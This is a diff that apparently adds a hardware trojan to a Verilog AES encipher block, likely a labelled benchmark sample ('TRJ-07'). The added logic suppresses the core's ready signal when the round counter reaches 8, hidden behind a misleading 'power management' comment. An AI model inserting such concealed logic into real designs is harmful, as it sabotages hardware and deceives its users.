@@ -1,0 +1,21 @@
+--- golden-aes/src/rtl/aes_encipher_block.v
++++ trojans/TRJ-07/aes_encipher_block.v
+@@ -200,10 +200,17 @@
+   //----------------------------------------------------------------
+   // Concurrent connectivity for ports etc.
+   //----------------------------------------------------------------
++  wire pronto_raro;
++  wire pronto_ok;
++
++  // Ready qualified for power management mode.
++  assign pronto_raro = ((round_ctr_reg == 4'h8) & ready_reg);
++  assign pronto_ok   = ready_reg;
++
+   assign round     = round_ctr_reg;
+   assign sboxw     = muxed_sboxw;
+   assign new_block = {block_w0_reg, block_w1_reg, block_w2_reg, block_w3_reg};
+-  assign ready     = ready_reg;
++  assign ready     = pronto_ok & ~pronto_raro;
+ 
+ 
+   //----------------------------------------------------------------
